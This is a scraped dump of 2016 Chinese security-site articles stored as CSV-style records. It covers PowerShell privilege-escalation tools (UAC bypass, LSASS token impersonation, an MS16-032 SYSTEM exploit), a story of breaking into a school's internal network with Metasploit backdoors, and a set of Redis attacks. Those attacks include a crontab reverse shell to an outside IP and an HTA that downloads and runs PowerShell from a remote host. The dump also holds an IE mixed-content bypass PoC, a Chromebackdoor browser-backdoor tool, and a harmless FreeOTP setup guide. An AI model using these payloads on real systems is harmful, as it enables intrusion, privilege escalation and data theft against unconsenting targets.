has 71 handle objects PID ObjectType      HandleFlags        Handle KernelPointer AccessMask --- ----------      -----------        ------ ------------- ----------2288 Directory       NONE               0x0004 0x88E629F0    0x000000002288 File            NONE               0x0008 0x84560C98    0x001000002288 File            NONE               0x000C 0x846164F0    0x001000002288 Key             NONE               0x0010 0xA3067A80    0x000200002288 ALPC Port       NONE               0x0014 0x8480C810    0x001F00002288 Mutant          NONE               0x0018 0x8591FEB8    0x001F00002288 Key             NONE               0x001C 0x96719C48    0x000200002288 Event           NONE               0x0020 0x850C6838    0x001F0000...Snip...Get-TokenPrivs打开进程的句柄，并调用Advapi32 :: GetTokenInformation列出与进程相关联的特权。Get token privileges for PID 3836C:\PS&gt; Get-TokenPrivs -ProcID 3836[?] PID 3836 --&gt; calc[+] Process handle: 1428[+] Token handle: 1028[+] Token has 5 privileges:LUID Privilege---- ---------  19 SeShutdownPrivilege  23 SeChangeNotifyPrivilege  25 SeUndockPrivilege  33 SeIncreaseWorkingSetPrivilege  34 SeTimeZonePrivilegeGet-Exports获取DLL导出并且可以选择 C++ wrapper输出，它会将DLL读入内存，然后解释它们。所以不管是x32还是x64的DLL都可以解释执行。PS C:\&gt; Get-Exports -DllPath C:\Windows\System32\ubpm.dll[?] 32-bit Image![&gt;] Time Stamp: 07/15/2016 18:07:55[&gt;] Function Count: 16[&gt;] Named Functions: 16[&gt;] Ordinal Base: 1[&gt;] Function Array RVA: 0x2F578[&gt;] Name Array RVA: 0x2F5B8[&gt;] Ordinal Array RVA: 0x2F5F8Ordinal ImageRVA   FunctionName------- --------   ------------      1 0x000242A0 UbpmAcquireJobBackgroundMode      2 0x00004750 UbpmApiBufferFree      3 0x00004E30 UbpmCloseTriggerConsumer      4 0x000135E0 UbpmInitialize      5 0x00008D00 UbpmOpenTriggerConsumer      6 0x000242C0 UbpmReleaseJobBackgroundMode      7 0x00013230 UbpmSessionStateChanged      8 0x000242E0 UbpmTerminate      9 0x00003BD0 UbpmTriggerConsumerConfigure     10 0x000040C0 UbpmTriggerConsumerControl     11 0x00025B10 UbpmTriggerConsumerControlNotifications     12 0x00025B40 UbpmTriggerConsumerQueryStatus     13 0x0000E1B0 UbpmTriggerConsumerRegister     14 0x000043F0 UbpmTriggerConsumerSetDisabledForUser     15 0x00012480 UbpmTriggerConsumerSetStatePublishingSecurity     16 0x00005330 UbpmTriggerConsumerUnregisterpwndBypass-UACBypass-UAC提供了一个能够进行UAC绕过的框架，该框架可以通过调用IFileOperation COM对象所提供的方法来实现自动提权。这其实并不是一种新的技术了，在此之前，我们可以通过向“explorer.exe”进程注入DLL来实现UAC绕过。但是这种方式并不是最有效的，因为向explorer注入DLL很有可能会触发系统的安全警报。不仅如此，利用这种固定的、无法控制的DLL来实现UAC绕过，将会极大地降低操作的灵活性。C:\PS&gt; Bypass-UAC -Method ucmDismMethod[!] Impersonating explorer.exe![+] PebBaseAddress: 0x000007F73E93F000[!] RtlEnterCriticalSection --&gt; &amp;Peb-&gt;FastPebLock[&gt;] Overwriting &amp;Peb-&gt;ProcessParameters.ImagePathName: 0x000000569B5F1780[&gt;] Overwriting &amp;Peb-&gt;ProcessParameters.CommandLine: 0x000000569B5F1790[?] Traversing &amp;Peb-&gt;Ldr-&gt;InLoadOrderModuleList doubly linked list[&gt;] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x000000569B5F2208[&gt;] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x000000569B5F2218[!] RtlLeaveCriticalSection --&gt; &amp;Peb-&gt;FastPebLock[&gt;] Dropping proxy dll..[+] 64-bit Yamabiko: C:\Users\b33f\AppData\Local\Temp\yam1730961377.tmp[&gt;] Creating XML trigger: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml[&gt;] Performing elevated IFileOperation::MoveItem operation..[?] Executing PkgMgr..[!] UAC artifact: C:\Windows\System32\dismcore.dll[!] UAC artifact: C:\Users\b33f\AppData\Local\Temp\pac500602004.xmlMasquerade-PEB它可以使用PSReflect组件。这个函数可以重写PowerShell的PEB结构，从而实现伪装“explorer.exe”的目的。C:\PS&gt; Masquerade-PEB -BinPath C:\Windows\System32\notepad.exe[?] PID 2756[+] PebBaseAddress: 0x7FFD3000[!] RtlEnterCriticalSection --&gt; &amp;Peb-&gt;FastPebLock[&gt;] Overwriting &amp;Peb-&gt;ProcessParameters.ImagePathName: 0x002F11F8[&gt;] Overwriting &amp;Peb-&gt;ProcessParameters.CommandLine: 0x002F1200[?] Traversing &amp;Peb-&gt;Ldr-&gt;InLoadOrderModuleList doubly linked list[&gt;] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x002F1B74[&gt;] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x002F1B7C[!] RtlLeaveCriticalSection --&gt; &amp;Peb-&gt;FastPebLockInvoke-SMBShell这是一个基于SMB通信协议的交互式Shell。Server：PS C:\&gt; Invoke-SMBShell+-------| Host Name: 0AK| Named Pipe: tapsrv.5604.yk0DxXvjUD9xwyJ9| AES Key: q6EKfuJTX93YUnmX+-------[&gt;] Waiting for client..SMB shell: whoami0ak\b33fSMB shell: IdontExistThe term 'IdontExist' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.SMB shell: $PSVersionTableName                           Value----                           -----PSRemotingProtocolVersion      2.2BuildVersion                   6.2.9200.17065PSCompatibleVersions           {1.0, 2.0, 3.0}PSVersion                      3.0CLRVersion                     4.0.30319.42000WSManStackVersion              3.0SerializationVersion           1.1.0.1SMB shell: leave[!] Client disconnecting..[&gt;] Waiting for client..SMB shell: calcJob SMBJob-dVkIkAkXINjMe09S completed successfully!SMB shell: exit[!] Client disconnecting..[!] Terminating server..PS C:\&gt;Client:# Client disconnected because of ""leave"" commandPS C:\&gt; Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9# Client disconnected because ""exit"" command kills client/serverPS C:\&gt; Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9Conjure-LSASS使用SeDebugPrivilege复制LSASS访问令牌，然后冒用它调用线程。如果SeDebugPrivilege被禁用，我们可以重新启用它。Conjure LSASS into our midst! ;) C:\PS&gt; Conjure-LSASS[?] SeDebugPrivilege is available![+] Current process handle: 852[&gt;] Calling Advapi32::OpenProcessToken[+] Token handle with TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY: 2000[?] SeDebugPrivilege is enabled![&gt;] Calling Advapi32::OpenProcessToken --&gt; LSASS[+] Token handle with TOKEN_IMPERSONATE|TOKEN_DUPLICATE: 1512[&gt;] Calling Advapi32::DuplicateToken --&gt; LSASS[+] Duplicate token handle with SecurityImpersonation level: 2008[&gt;] Calling Advapi32::SetThreadToken[+] Knock knock .. who's there .. LSASS[+] User context: SYSTEMC:\PS&gt; whoamiERROR: Access is denied.ERROR: Access is denied.C:\PS&gt; Get-ChildItem -Path hklm:SAM    Hive: HKEY_LOCAL_MACHINE\SAMSKC  VC Name                           Property---  -- ----                           --------  3   2 SAM                            {C, ServerDomainUpdates}Invoke-MS16-032这是使用powershell实现的MS16-032的漏洞利用脚本，MS16-032是Windows提权漏洞，大家都懂得啊，不解释了。目标:Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!Tested on x32 Win7, x64 Win8, x64 2k12R2Sit back and watch the pwn!C:\PS&gt; Invoke-MS16-032         __ __ ___ ___   ___     ___ ___ ___        |  V  |  _|_  | |  _|___|   |_  |_  |        |     |_  |_| |_| . |___| | |_  |  _|        |_|_|_|___|_____|___|   |___|___|___|                       [by b33f -&gt; @FuzzySec][?] Operating system core count: 2[&gt;] Duplicating CreateProcessWithLogonW handle[?] Done, using thread handle: 956[*] Sniffing out privileged impersonation token..[?] Thread belongs to: svchost[+] Thread suspended[&gt;] Wiping current impersonation token[&gt;] Building SYSTEM impersonation token[?] Success, open SYSTEM token handle: 964[+] Resuming thread..[*] Sniffing out SYSTEM shell..[&gt;] Duplicating SYSTEM token[&gt;] Starting token race[&gt;] Starting process race[!] Holy handle leak Batman, we have a SYSTEM shell!!Subvert-PE将shellcode注入到PE映像中。Analyse the PE header and hexdump the region of memory where shellcode would be injected.C:\PS&gt; Subvert-PE -Path C:\Path\To\PE.exeSame as above but continue to inject shellcode and overwrite the binary.C:\PS&gt; Subvert-PE -Path C:\Path\To\PE.exe -WriteUtilityTrace-Execution使用Capstone引擎从其入口点递归地拆解PE（x32 / x64），由于反汇编是静态的，x32 / x64 PE都可以反汇编，不管PowerShell的位数。PS C:\&gt; Trace-Execution -Path .\Desktop\some.exe -InstructionCount 10[&gt;] 32-bit Image![?] Call table:Address    Mnemonic Taken Reason-------    -------- ----- ------0x4AD0829A call     Yes   Relative offset call0x4AD07CB7 call     No    Indirect call[?] Instruction trace:Size Address    Mnemonic Operands                    Bytes                   RegRead  RegWrite---- -------    -------- --------                    -----                   -------  --------   5 0x4AD0829A call     0x4ad07c89                  {232, 234, 249, 255...} {esp}   2 0x4AD07C89 mov      edi, edi                    {139, 255, 249, 255...}   1 0x4AD07C8B push     ebp                         {85, 255, 249, 255...}  {esp}    {esp}   2 0x4AD07C8C mov      ebp, esp                    {139, 236, 249, 255...}   3 0x4AD07C8E sub      esp, 0x10                   {131, 236, 16, 255...}           {eflags}   5 0x4AD07C91 mov      eax, dword ptr [0x4ad240ac] {161, 172, 64, 210...}   4 0x4AD07C96 and      dword ptr [ebp - 8], 0      {131, 101, 248, 0...}            {eflags}   4 0x4AD07C9A and      dword ptr [ebp - 4], 0      {131, 101, 252, 0...}            {eflags}   1 0x4AD07C9E push     ebx                         {83, 101, 252, 0...}    {esp}    {esp}   1 0x4AD07C9F push     edi                         {87, 101, 252, 0...}    {esp}    {esp}   5 0x4AD07CA0 mov      edi, 0xbb40e64e             {191, 78, 230, 64...}   5 0x4AD07CA5 mov      ebx, 0xffff0000             {187, 0, 0, 255...}   2 0x4AD07CAA cmp      eax, edi                    {59, 199, 0, 255...}             {eflags}   6 0x4AD07CAC jne      0x4ad1bc8c                  {15, 133, 218, 63...}   {eflags}   1 0x4AD07CB2 push     esi                         {86, 133, 218, 63...}   {esp}    {esp}   3 0x4AD07CB3 lea      eax, dword ptr [ebp - 8]    {141, 69, 248, 63...}   1 0x4AD07CB6 push     eax                         {80, 69, 248, 63...}    {esp}    {esp}   6 0x4AD07CB7 call     dword ptr [0x4ad01150]      {255, 21, 80, 17...}    {esp}   3 0x4AD07CBD mov      esi, dword ptr [ebp - 4]    {139, 117, 252, 0...}   3 0x4AD07CC0 xor      esi, dword ptr [ebp - 8]    {51, 117, 248, 0...}             {eflags}项目地址：https://github.com/FuzzySecurity/PowerShell-Suite","2016-11-29 12:51:50","安全工具","神级脚本大集合之PowerShell-Suite","http://nsoad.com/Security-tools/20161129/tools-862.html"
"5ccbfab24f2f0a0a7a69c0a8","0x00 起因某天：男朋友发来了他学校的shell叫内网渗透2333ps；一般jsp的shell不是system权限就是administrator权限这是因为管理员对tomcat设置不确当而这种NT一看就是admin","blackhold","0x00 起因某天：男朋友发来了他学校的shell叫内网渗透2333ps；一般jsp的shell不是system权限就是administrator权限这是因为管理员对tomcat设置不确当而这种NT一看就是administrator 而内网ip10.xxx自然也是映射到58外网的8102端口上因为是内网所以用外网metasploit服务器生成个后门反弹回来获得一个shell生成后们监听什么的 可以看我这一篇文章利用metasploit(meterpreter)提下system权限加不了账号的shell得到shell之后转发进内网portfwd add -l 3344 -p 3389 -r 127.0.0.1把内网服务器3389端口映射到外网服务器的3344端口上 这样就可以链接内网服务器了初探内网的环境是这样的因为是双网卡所以有两个IPnei view 看了一下只是一个普通的工作组 而并不是域然后用hscan扫描了一轮之后3个mssql弱口令 然而129和254是同一台机器 是一张网卡开了mssql链接自己的另一张网卡所以链接10.60.128.2这台机器的时候 用mssql执行了一下cmd查看了一下ip看到发现他也是有两张网卡 192.168和自己的10.60.128.2作为mssql外联链接（又是自己链接自己）而网关则是我已经控制的10.60.131.254 有点好奇192.168那个网段里面是不是也有别的机器但是10.的网段却ping不通192然后试一下用192的机器去 很幸运 反向可以ping通现在再来构思一下拓扑其他10网段的机器 我抓取了本地管理员账号密码尝试3389登陆无果 mssql也爆破不出现在一心想着192那个内网首先我们获得了10的权限 和192的cmd权限 192的机器不联网 但是可以访问10的资源 可以在10搭建一个http 然后放个木马在192的cmd wget下载下来运行通过外网metasploit服务器与已经拿下的10做一个跳板 再通过reverse木马链接经过10再链接会metasploit外网服务器先是做跳板然后再10.搭建一个http服务器 再用wget下载下来现在msf已经可以访问到10的机器了 在通过wget命令吧后门下载到192的服务器并且运行192就会链接到10再链接到msf外网服务器反弹到了shell回来了接着做上一部的转发就可以链接到192的服务器了然后链接去192的服务器 hscan扫了一轮 发现192网段只有它这一台机器 蛋疼。。然后。。除了蛋疼还是蛋疼其他10网段的机器 我抓取了本地管理员账号密码尝试3389登陆无果 mssql也爆破不出 可能是我字典辣鸡吧想着用cain嗅探  但是这尼玛双核卡到爆炸的服务器丢包率实在是高高高~本来以为192网段里面有很多机器等着漫游 结果就一台~~~欲哭无泪","2016-08-02 00:48:38","Web安全","记一次蛋疼渗透内网某机器","http://nsoad.com/Article/web/20160802/252.html"
"5ccbfab24f2f0a0a7a69c0a9","redis的exploit，完全不需要flushall破坏数据场景，redis-cli set 1 &lsquo;ringzero&rsquo;，这样可以控制第一条记录，就能保证你的内容始终保持在最前面；测试环境：Cent","silence","redis的exploit，完全不需要flushall破坏数据场景，redis-cli set 1 ‘ringzero’，这样可以控制第一条记录，就能保证你的内容始终保持在最前面；测试环境：CentOS，RHEL# 利用crontab反弹shellredis-cli flushall echo -e ""\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/114.114.114.114/53 0&gt;&amp;1\n\n""|redis-cli -x set 1 redis-cli config set dir /var/spool/cron/ redis-cli config set dbfilename root redis-cli save# 利用crontab创建文件 /tmp/888redis-cli flushall # 为了方便测试 redis-cli set test 'test' redis-cli set my 'mymymymymymymymymymymymy' redis-cli set word 'wordwordwordwordwordword' redis-cli set hello 'ringzero' redis-cli set word1 'word1word1word1word1word1word1' echo -e ""\n\n*/1 * * * * /bin/touch /tmp/888\n\n""|redis-cli -x set 1 redis-cli config set dir /var/spool/cron/ redis-cli config set dbfilename root redis-cli saveredis-cli flushall echo -e ""\n\n*/1 * * * * /bin/touch /tmp/888\n\n""|redis-cli -x set 1 redis-cli config set dir /var/spool/cron/ redis-cli config set dbfilename root redis-cli save# 二次改写crontabredis-cli flushall redis-cli set 2 ';a=`redis-cli get c`;' redis-cli set 1 'id;redis-cli set r `$a`;#' redis-cli config set dir /tmp/ redis-cli config set dbfilename w redis-cli save redis-cli set c whoami# 利用第一步的写crontab步骤，完成下面的命令echo "" "" &gt; /tmp/zz cat /tmp/w &gt;&gt; /tmp/zz /bin/sh /tmp/zz redis-cli get r控制 /var/spool/cron/root 和 /tmp/zz# 最终实现，每10秒从redis的c变量读入要执行的命令，再将执行结果写入变量r* * * * * sleep 10;/bin/sh /tmp/zzwindows利用方式（转自90sec）redis 官方未发布windows版本，但是野外存在redis/win版本。在测试时发现一windows版本redis，遂开始搞。直接上利用，基于msf:root@weisuo.org:~# cat hta-psh.txt  &lt;scRipt language=""VBscRipT""&gt;CreateObject(""WscrIpt.SheLL"").Run ""powershell -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')""&lt;/scRipt&gt;[url=mailto:root@weisuo.org]root@weisuo.org[/url]:~#  cat hta-psh.txt |redis-cli -x -h 192.168.138.27 set aOKhta-psh.txt 对一些字符串进行变通，如不，在写入时会导致字符串丢失。#msfconsole use payload/windows/meterpreter/reverse_tcpgenerate -t hta-psh -f /var/www/1.ps1#之后起个handle，略修改1.ps1，文件内容大概如下：$command=”powershell -nop -w hidden -e xxxxxxxxxxxxxxxx”;iex $command;$command2=”taskkill /im mshta.exe”;iex $command2;最后写入文件，等待管理员登陆oot@weisuo.org:~# redis-cli -h 192.168.138.27redis 192.168.138.27:6379&gt; CONFIG GET dir1) ""dir""2) ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup""redis 192.168.138.27:6379&gt; config get dbfilename1) ""dbfilename""2) ""2.hta""redis 192.168.138.27:6379&gt; saveOKredis 192.168.138.27:6379&gt;[/p][p=20, null, left] msf exploit(handler) &gt; rexploit -j -z[*] Stopping existing job...[*] Reloading module...[*] Exploit running as background job. [*] Started reverse TCP handler on 119.91.151.22:80msf exploit(handler) &gt; [*] Starting the payload handler...[*] Sending stage (957999 bytes) to 60.111.27.14[*] Meterpreter session 4 opened (119.91.151.22:80 -&gt; 60.191.37.34:56301) at 2016-06-06 11:06:00 -0400[*] Session ID 4 (119.91.151.22:80 -&gt; 60.111.27.14:56301) processing AutoRunScript 'migrate -f'[*] Current server process: powershell.exe (4896)[*] Spawning notepad.exe process to migrate to[+] Migrating to 3768[+] Successfully migrated to process","2016-08-03 21:14:59","Web安全","redis利用姿势收集","http://nsoad.com/Article/web/20160803/257.html"
"5ccbfab24f2f0a0a7a69c0aa","0. 前言在渗透测试时，很多人还是在使用PSEXEC类工具。PSEXEC类的工具有各种语言的实现，如Metasploit的psexec psexec_psh，Impacket psexec，pth-winexe，Empire Invoke-P","kong","毋庸置疑，当今网络正在向 HTTPS（安全）内容发展。重要的域名现在他们已经将证书准备好了，他们的站点应该是有效且安全的。但是你是不是很好奇：到底能安全到何种程度？显然，通过 HTTPS 提供的内容是可以抵御中间人攻击（MITM），网络嗅探/篡改等方面的攻击的。但是你有没有想过， HTTPS 协议是否保护终端用户免受其他方面的威胁？答案显然是肯定的。如我们所知，攻击者目前使用了广泛的渠道提供他们的恶意 payload ，恶意广告便是其中之一。他们购买廉价的广告空间展示显眼的广告，但是在这些 banner 的深处，我们可以发现混淆的恶意代码。其实，我们已经看到过坏人曾经是如何检测用户是否属于潜在受害者（注：参考 http://paper.seebug.org/87/ ），或者检测出她是个分析人员的。如果键盘背后的人是一个不够精明的用户，攻击者会提供完整的恶意 payload ，否则他们只是简单地伪装成合法产品的广告。混合内容警告攻击者现在有个问题，因为他们的技巧只在不安全的页面有效，而浏览器默认情况下不会在安全的网站呈现不安全的内容。具体来说如果攻击者强行通过 HTTPS 加载他们的代码，他们的很多技巧（比如检测文件系统）将无法实施。考虑一点： IE/Edge (和其他浏览器) 拒绝从安全的域(HTTPS)加载不安全的内容 (HTTP) .现代浏览器默认情况下不会渲染混合内容（来自安全站点的不安全数据）。如果我们浏览 HTTPS 网页，浏览器会拒绝加载不安全的内容（例如，里面有个 banner 的 HTTP iframe）。Internet Explorer 将向用户发出“显示所有内容”（重新加载主页并显示所有混合内容）的警告。Edge 还会阻止内容，但除非用户使用 devtools-console 窗口查看，否则不会显示警告。此外，如果不安全的内容来自 iframe，则会显示混乱的错误信息。允许加载图片一个有趣的例外是，所有浏览器允许无限制加载并渲染不安全的图像。换句话说，如果攻击者已经在网络中进行嗅探，他们将能够在运行中浏览并替换图片，但这并不代表对最终用户的真正威胁。一年前 Eric Lawrence (aka: Internet Hero) 写了一篇博文很清晰地解释了为什么 IE 的团队允许不提示警告的情况下加载不安全的图像。这是很有道理的：许多网站使用 HTTP 协议从外部加载它们的图像，或更糟的情况，它们在资源中硬编码了指向本地图像的 HTTP 协议，但内容本身（html/scripts）是安全的。所以，它们决定允许图像标签加载一个没有警告的渲染器，除了地址栏右边的小挂锁会消失。这是地址栏在 IE 上加载不安全图片之前和之后的样子。注意主地址栏的安全协议根本不会改变。我用红圈标记了锁，这样更容易看到。同样的事情发生在 Microsoft Edge 上，但锁的图标在左边。如果你想试验一下，可以在此试一下。有件有趣的事要记住，两个浏览器都认为伪协议（res: mhtml: file:）是不安全的，所以如果我们尝试使用这些协议加载内容，都会失败，就像普通 http 在 https 中那样。These iframes won't render anything if the main page is secure/https&lt;iframe src=""http://""&gt;  &lt;iframe src=""res://""&gt;  &lt;iframe src=""file://""&gt;  &lt;iframe src=""mhtml://""&gt;  &lt;iframe src=""mhtml:res://""&gt;  使用伪协议的行为你可能在想，HTTPS 与这些奇怪的 mhtml: 和 res: 协议有什么关系？这些奇怪的协议被使用者用来加载硬盘中的文件，用于检测本地文件的存在，如果主页是安全的，他们将有一个大问题：IE 将拒绝解析这些协议。因此不要使用他们的技巧！考虑一下：安全的网页不仅帮助我们免受 MITM 攻击，而且作为副作用防止了攻击者的很多小把戏。谨记：当攻击者想要检查用户在她的文件系统中是否有特定文件，他们往往使用熟知的技术来利用 mhtml/res/file 协议。 如果你从来没有见过相关技巧，请看这个技巧相关的博文，但这里需要注意的是：现代浏览器默认不允许“混合内容”，而且许多技巧将在 HTTPS 中失效。强制加载内容那么现在我们知道了攻击者的意图，是时候验证他们尝试的技巧了：绕过这些警告。之前我们知道了在没有用户交互的情况下渲染内容的规则（image 标签）存在着例外情况，我尝试加载源是图像的 IFRAME （而不是 IMG），但并没有成功。然后整了点 EMBED 和 OBJECT 元素（二者皆可渲染 html）也没真正成功。最后，我决定使用常规 IFRAME ，但是通过使用服务器重定向而不是直接使用不安全的 URL 设置其 location 属性。这似乎有效，内容终于加载上了。Main page should be secure/httpsThe iframe below renders an insecure (http) bing.com  &lt;iframe src=""https://www.cracking.com.ar/redir/redir.php?URL=http://www.bing.com""&gt;  当不安全的 bing.com 试图渲染另一个不安全的 iframe 内部内容时，问题就发生了。换句话说，iframe 的子元素也需要是安全的或者是绕过的，相同的技巧也需要进行重定向。但是这并没什么用，因为攻击者需要 IE 伪协议（mhtml: res: 和 file:）来实现他们的技巧，而 IE 不接受服务器重定向至那些协议。我们需要有更好的选择。绕过警告信息为了找到绕过警告信息的方法，我偶然发现了解决方案。我很惊讶，这个技巧是那么基础的东西：在不安全的 iframe 中放一个 document.write 就够了。可能这么简单吗？一看便知：Main page should be secure/httpsThe iframe below renders an insecure (http) page which does a document.write  &lt;iframe src=""https://www.cracking.com.ar/redir/redir.php?URL=http://unsafe.cracking.com.ar""&gt;The HTML code in the iframe is quite simple:  &lt;script&gt;document.write()&lt;/script&gt;  一旦加载了不安全的内容和 document.write ，iframe 就可以自由加载不安全的内容了，而且无需重定向。换句话说，这时攻击者可以加载 mhtml/res 协议，无限制施展他们的技巧：IE 不知道这些内容是正在被渲染的，每个嵌入的 iframe 将加载无误。在线 PoC 地址Edge 浏览器受该重定向技巧的漏洞影响，但 document.write 的方法并不奏效。也许另有途径，但我在此停顿下来，我知道攻击者仍然有简单的方法来达到他们的恶意目的。","2016-11-17 14:55:35","Web安全","绕过混合内容警告 - 在安全的页面加载不安全的内容","http://nsoad.com/Article/web/20161117/795.html"
"5ccbfab24f2f0a0a7a69c0ab","安全建设过程中，总体预算、投入产出比均是首先需要考虑的问题，缺少具备开发能力的人员、缺少资金预算的情况下，开源产品就成了必然的选择。","kong","安全建设过程中，总体预算、投入产出比均是首先需要考虑的问题，缺少具备开发能力的人员、缺少资金预算的情况下，开源产品就成了必然的选择。        0×01 前言虎符是古代皇帝调兵遣将用的兵符，用青铜或者黄金做成伏虎形状的令牌，劈为两半，其中一半交给将帅，另一半由皇帝保存，只有两个虎符同时合并使用，持符者即获得调兵遣将权。虎符也大致可看做是双因素身份认证的早期应用了。0×02 2FA&amp;OTP2FA，双因素认证。一是你知道什么，一是你有什么或者你是什么，比如说，你需要提供密码，同时你还需提供动态口令，又或者采用虹膜、指纹等生物特征作为第二因素进行身份认证，当然，指纹因容易被伪造，很多安全专家并不推荐使用。企业安全管理中，综合成本、部署维护难易程度等原因，OTP是一个不错的选择。OTP全称为One-Time-Password，也称动态口令，在需要强身份认证的场合比较常用，常见的应用有网银硬件令牌、手机令牌等。具备动态口令功能的商业产品比较多，有实力的企业可以自行选择。本文中我们选择Freeotp作为OTP解决方案。Freeotp是一款来自Red Hat的开源的软令牌解决方案，支持HTOP和TOTP，同时提供了IOS和Android客户端。Freeotp已集成在Freeipa中，这里我们从部署Freeipa开始。0×03 Freeipa安装 测试环境os:centos7 ipa_hostname:ipatest ipa_domain:example.com ipa_address 1.1.1.1 IPA NetBIOS:IPATEST ad_hostname:it-dc01 ad_domain:it.local ad_address:2.2.2.2部署过程1、更新系统 yum update -y 2、安装freeipa相关组件 yum install -y ""*ipa-server""""*ipa-server-trust-ad"" bind bind-dyndb-ldap ipa-server-dns 3、系统配置 echo ""1.1.1.1 ipatest.example.com ipatest"" &gt;&gt;/etc/hosts hostname ipatest.example.com 4、ipa服务配置 ipa-server-install -a mypassword1 -p mypassword2 --domain=example.com--realm=EXAMPLE.COM --setup-dns --no-forwarders -U 5、获取ipa管理员权限 kinit admin 6、防火墙iptables安装配置 chkconfig firewalld off service firewalld stop yum install -y iptables-services chkconfig iptables on echo ""*filter"" &gt; /etc/sysconfig/iptables echo "":INPUT ACCEPT [0:0]"" &gt;&gt; /etc/sysconfig/iptables echo "":FORWARD ACCEPT [0:0]"" &gt;&gt; /etc/sysconfig/iptables echo "":OUTPUT ACCEPT [0:0]"" &gt;&gt; /etc/sysconfig/iptables echo ""-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT""&gt;&gt; /etc/sysconfig/iptables echo ""-A INPUT -p icmp -j ACCEPT"" &gt;&gt; /etc/sysconfig/iptables echo ""-A INPUT -i lo -j ACCEPT"" &gt;&gt; /etc/sysconfig/iptables echo ""-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -jACCEPT"" &gt;&gt; /etc/sysconfig/iptables echo ""# -A INPUT -s ad_ip_address -p tcp -m multiport --dports 389,636 -mstate --state NEW,ESTABLISHED -j REJECT"" &gt;&gt; /etc/sysconfig/iptables echo ""-A INPUT -p tcp -m multiport --dports80,88,443,389,636,88,464,53,138,139,445 -m state --state NEW,ESTABLISHED -jACCEPT"" &gt;&gt; /etc/sysconfig/iptables echo ""-A INPUT -p udp -m multiport --dports 88,464,53,123,138,139,389,445-m state --state NEW,ESTABLISHED -j ACCEPT"" &gt;&gt;/etc/sysconfig/iptables echo ""-A INPUT -p udp -j REJECT"" &gt;&gt; /etc/sysconfig/iptables echo ""-A INPUT -p tcp -j REJECT"" &gt;&gt; /etc/sysconfig/iptables echo ""-A FORWARD -j REJECT --reject-with icmp-host-prohibited""&gt;&gt; /etc/sysconfig/iptables echo ""COMMIT"" &gt;&gt; /etc/sysconfig/iptables service iptables restart 至此Freeipa安装完毕。Dns服务器配置域名解析ipatest.example.com后即可通过 https:// ipatest.example.com管理ipa服务器。如需与已经部署的MS AD 系统进行集成，还需要进行账户密码等的同步设置，具体配置请参考：http://gatwards.org/techblog/ipaactive-directory-sync-configuration http://directory.fedoraproject.org/docs/389ds/download.html#windows-password-synchronization0×04 FREEOTP配置首先登陆freeipa服务器。用户名admin，密码是上一节安装过程中配置的mypassword1。1、启用OTP服务端启用OTP有两种方式。一是在全局配置中，为所有用户启用OTP：依次找到【IPA Server】-【Configuration】-【Default user authentication types】，勾选【Two factorauthentication (password + OTP)】二是为每一个用户分别启用OTP：    2、添加、删除、禁用、启用令牌依次进入【Authentication】-【OTP tokens】，根据需要选择添加、删除或禁用、启用令牌 令牌配置：    3、客户端导入令牌：在应用市场搜索freeotp，下载并安装客户端。客户端可以通过扫描服务端添加令牌配置后生成的二维码添加令牌。  0×05 应用场景和配置实例应用场景：WEB应用认证、VPN用户登录认证等应用的接入可以直接采用LDAP协议，这里不再详述。配置实例：ITOP配置实例 'authent-ldap' =&gt; array ( 'host' =&gt; '1.1.1.1', 'port' =&gt; 389, 'default_user'=&gt;'uid=test123,CN=users,CN=accounts,DC=example,DC=com', 'default_pwd'=&gt; 'testpass!!', 'base_dn' =&gt; 'CN=users,CN=accounts,DC=example,DC=com', 'user_query' =&gt; '(&amp;(uid=%1$s))', 'options' =&gt; array ( 17 =&gt; 3, 8 =&gt; 0, ), 同时，在ITOP中添加对应的用户test123后即可进行登录测试，经过验证，OTP系统运行正常，原有的密码被替换成了密码+OTP。    0×06 后续工作至此，资金和技术问题已经解决，接下来的工作就是如何推动业务部门接入OTP系统了。0×07 参考内容Multi-factor authenticationhttps://en.wikipedia.org/wiki/Multi-factor_authenticationFreeIPAhttp://www.freeipa.org/page/Main_PageACIs Manuallyhttps://www.centos.org/docs/5/html/CDS/ag/8.0/Managing_Access_Control-Creating_ACIs_Manually.html","2016-12-08 20:50:36","安全工具","企业安全拥抱开源之FREEOTP部署实战","http://nsoad.com/Security-tools/20161208/tools-899.html"
"5ccbfab24f2f0a0a7a69c0ac","Chromebackdoor 是一款渗透测试工具，该工具使用 MITB 技术生成Windows可执行文件 “.exe”，启动程序会运行恶意的插件扩展，或运行支持主流浏览器的脚本.....","paper","项目地址：https://github.com/graniet/chromebackdoorChromebackdoor 是一款渗透测试工具，该工具使用 MITB 技术生成Windows可执行文件 “.exe”，启动程序会运行恶意的插件扩展，或运行支持主流浏览器的脚本，并发送所有 DOM 数据以执行命令进行控制。、安装方法环境要求：pip%20install%20crxmake%20  wine32%20 python%20chromebackdoor.py%20 安装web1) 首先解压生成的 chromebackdookunzip folder.zip  2) 上传 web 文件夹至服务器3) 创建数据库和用户，更新配置文件 对应路径/web/includes/config.php4) 数据库导入 .SQL 文件/SQL/chromebackdoor.sql5) 登录 Web 面板 (web/index.php)username = root  password = toor  生成被控端（不通过 .exe）安装依赖 &amp; python chromebackdoor.pypython chromebackdoor.py  可以给各大主流浏览器生成后门。比如 Google Chrome：python chromebackdoor.py --chrome  这时需要输入域名 (需要 SSL):[?] Website hosted (https://localhost/)? https://lynxframework.com/relais (需要SSL):[?] Website relais url (https://localhost/relais)? https://lynxrelay.com/relaisor use same domain  [?] Website relais url (https://localhost/relais)? 